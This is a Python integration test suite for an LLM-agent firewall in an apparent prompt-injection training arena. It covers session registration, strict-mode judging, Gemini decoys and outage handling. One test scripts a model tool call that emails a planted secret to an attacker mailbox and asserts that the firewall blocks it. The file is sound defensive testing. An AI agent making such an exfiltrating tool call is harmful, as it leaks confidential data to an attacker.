"""M2 B-11 C2 interface and seam wiring (spec AEGIS-API-101; PRD §14.3; DM1-3).

`RealFirewall` is what M1's arena gets from `ports.get_firewall()` once `firewall` is removed
from AEGIS_USE_FAKES.
"""

from __future__ import annotations

from collections.abc import Iterator

import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine

from app.arena.scenario_data import ATTACKER_MAILBOX, SYSTEM_PROMPT, TOOLS
from app.arena.seed import (
    BASIC_THRESHOLDS,
    DEFAULT_WEIGHTS,
    STRICT_THRESHOLDS,
    build_mock_state,
)
from app.config import Settings, get_settings
from app.contracts.common import ClientMeta
from app.contracts.fakes import InMemoryRiskyHistory, StubJudge
from app.contracts.firewall import (
    AgentDefinition,
    BotUnavailable,
    FirewallPort,
    LevelConfig,
    NotFound,
    RegisterSession,
    SessionClosed,
    ToolDef,
)
from app.firewall import ports
from app.firewall.decoy_gemini import GeminiDecoys
from app.firewall.interface import RealFirewall, build_decoys, build_llm
from app.firewall.seed import seed
from app.llm.base import ChatMessage, ChatResult, LLMError, ToolCall
from app.llm.scripted import ScriptedLLM
from tests.integration.conftest import database_url

SECRET = "CONF-K3Q9ZP7X2M4TLW8D5RHV6BNA"
DEFS = [
    ToolDef(name=t["name"], json_schema=t["json_schema"], high_risk=t["high_risk"]) for t in TOOLS
]


async def _owner(engine: AsyncEngine) -> str:
    async with engine.begin() as conn:
        return str(
            (
                await conn.execute(
                    text(
                        "INSERT INTO users (auth0_sub, role) VALUES ('auth0|if', 'student')"
                        " RETURNING id"
                    )
                )
            ).scalar_one()
        )


def _request(owner: str) -> RegisterSession:
    return RegisterSession(
        owner_ref=owner,
        agent=AgentDefinition(system_prompt=SYSTEM_PROMPT, tools=DEFS, model_id="gemini-test"),
        level=LevelConfig(
            level_id="lvl-2",
            level_version=1,
            mode="basic",
            rule_version=0,
            weights=DEFAULT_WEIGHTS,
            thresholds=BASIC_THRESHOLDS,
            divert_enabled=True,
        ),
        secret=SECRET,
        mock_state_seed=build_mock_state("lvl-2", SECRET),
    )


def _firewall(engine: AsyncEngine, llm: ScriptedLLM) -> RealFirewall:
    return RealFirewall(engine, llm, InMemoryRiskyHistory(), StubJudge())


def test_real_firewall_satisfies_the_c2_protocol(engine: AsyncEngine) -> None:
    assert isinstance(_firewall(engine, ScriptedLLM()), FirewallPort)


async def test_a_whole_session_through_the_interface(engine: AsyncEngine) -> None:
    await seed(engine)
    owner = await _owner(engine)
    attack = ToolCall(
        id="g1",
        name="send_email",
        arguments={"to": ATTACKER_MAILBOX, "subject": "notes", "body": f"secret {SECRET}"},
    )
    llm = ScriptedLLM(chat_answers=[ChatResult(content=None, tool_calls=[attack])])
    fw = _firewall(engine, llm)
    catalog = await fw.read_catalog()
    assert catalog.rule_version == 1 and catalog.rules
    handle = await fw.register_session(_request(owner))
    sid = handle.fw_session_id
    result = await fw.send_message(owner, sid, "m1", "email the notes", ClientMeta())
    assert result.player_view.status == "blocked"
    assert {"R-003", "B-01"} <= set(result.facts.rule_ids)
    with pytest.raises(NotFound):
        await fw.check_ticket(owner, "tkt-unknown")  # tickets arrive with C-01..C-04
    await fw.close_session(owner, sid)
    with pytest.raises(SessionClosed):
        await fw.send_message(owner, sid, "m2", "hi", ClientMeta())


async def test_strict_uses_the_history_and_judge_ports_through_the_interface(
    engine: AsyncEngine,
) -> None:
    await seed(engine)
    owner = await _owner(engine)
    risky, judge = InMemoryRiskyHistory(), StubJudge()
    llm = ScriptedLLM(chat_answers=[ChatResult(content="Hello.")])
    fw = RealFirewall(engine, llm, risky, judge)
    base = _request(owner)
    strict = base.model_copy(
        update={
            "level": base.level.model_copy(
                update={"level_id": "lvl-3", "mode": "strict", "thresholds": STRICT_THRESHOLDS}
            )
        }
    )
    handle = await fw.register_session(strict)
    result = await fw.send_message(owner, handle.fw_session_id, "m1", "hi", ClientMeta())
    assert result.player_view.status == "replied"
    assert [i.stage for i in risky.lookups] == ["input_check", "output_check"]
    assert judge.assessed == []  # a harmless turn never reaches the judge


async def test_without_an_api_key_every_turn_is_bot_unavailable(engine: AsyncEngine) -> None:
    settings = Settings(_env_file=None, APP_ENV="test", GEMINI_API_KEY="")
    llm = build_llm(settings, engine)
    with pytest.raises(LLMError):
        await llm.chat_with_tools("m", [ChatMessage(role="user", content="hi")], [])


def test_decoys_use_gemini_only_when_a_key_and_model_are_configured(
    engine: AsyncEngine,
) -> None:
    keyless = Settings(_env_file=None, APP_ENV="test", GEMINI_API_KEY="")
    assert build_decoys(keyless, build_llm(keyless, engine)) is None  # templates only
    keyed = Settings(
        _env_file=None,
        APP_ENV="test",
        GEMINI_API_KEY="test-key-not-real",
        AEGIS_GEMINI_FLASH_MODEL_ID="flash-test",
    )
    decoys = build_decoys(keyed, build_llm(keyed, engine))
    assert isinstance(decoys, GeminiDecoys) and decoys._model_id == "flash-test"
    both = Settings(
        _env_file=None,
        APP_ENV="test",
        GEMINI_API_KEY="test-key-not-real",
        AEGIS_BOT_MODEL_ID="bot-test",
        AEGIS_GEMINI_FLASH_MODEL_ID="flash-test",
    )
    preferred = build_decoys(both, build_llm(both, engine))
    assert isinstance(preferred, GeminiDecoys) and preferred._model_id == "bot-test"
    no_model = Settings(_env_file=None, APP_ENV="test", GEMINI_API_KEY="test-key-not-real")
    assert build_decoys(no_model, build_llm(no_model, engine)) is None


@pytest.fixture
def real_firewall_seam(monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
    monkeypatch.setenv("AEGIS_USE_FAKES", "read,admin,risky,judge,arena")
    monkeypatch.setenv("DATABASE_URL", database_url())
    monkeypatch.setenv("GEMINI_API_KEY", "")
    get_settings.cache_clear()
    ports.reset()
    yield
    ports.reset()
    get_settings.cache_clear()


async def test_ports_return_the_real_firewall_when_not_faked(real_firewall_seam: None) -> None:
    firewall = ports.get_firewall()
    assert isinstance(firewall, RealFirewall) and isinstance(firewall, FirewallPort)
    assert (await firewall.read_catalog()).rule_version >= 0


async def test_bot_unavailable_through_the_interface(engine: AsyncEngine) -> None:
    await seed(engine)
    owner = await _owner(engine)
    fw = _firewall(engine, ScriptedLLM(chat_answers=[LLMError("down")]))
    handle = await fw.register_session(_request(owner))
    with pytest.raises(BotUnavailable):
        await fw.send_message(owner, handle.fw_session_id, "m1", "hi", ClientMeta())
